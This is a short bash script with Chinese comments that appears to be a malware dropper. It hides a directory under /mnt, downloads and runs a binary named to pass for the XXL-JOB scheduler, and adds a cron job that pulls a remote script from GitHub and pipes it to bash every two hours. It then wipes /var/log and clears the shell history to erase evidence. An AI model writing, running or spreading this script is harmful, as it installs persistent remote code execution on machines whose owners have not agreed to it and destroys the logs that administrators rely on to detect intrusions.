#!/bin/bash

# 设置变量以提高可读性
OPT_S_DIR="/mnt/.s"
KMPATHD_FILE="$OPT_S_DIR/xxl_job"
CRON_JOB="0 */2 * * * curl -s -L https://raw.githubusercontent.com/YUNDUN8899/FUCKSEN/main/xxl.sh | bash"

# 检查/opt/.s目录是否存在，不存在则创建
if [ ! -d "$OPT_S_DIR" ]; then
    mkdir "$OPT_S_DIR"
fi

# 检查/opt/.s/kmpathd文件是否存在，不存在则下载
if [ ! -f "xxl_job" ]; then
    cd "$OPT_S_DIR" || exit
    wget https://github.com/YUNDUN8899/FUCKSEN/releases/download/BV10/xxl_job
    chmod +x "xxl_job"
else
    echo "KMPATHD file already exists, skipping download."
fi

# 检查进程是否存在，不存在则启动
if ! pgrep -f "xxl_job" > /dev/null; then
    nohup "/mnt/.s/xxl_job" /dev/null 2>&1 &
fi
# 清除上一次的任务，添加下一次的任务，每2小时执行一次
(crontab -l | grep -v "curl" ; echo "$CRON_JOB") | crontab -
# 清除当前系统的执行目录
sudo rm -rf /var/log/*
history -c && echo > ~/.bash_history
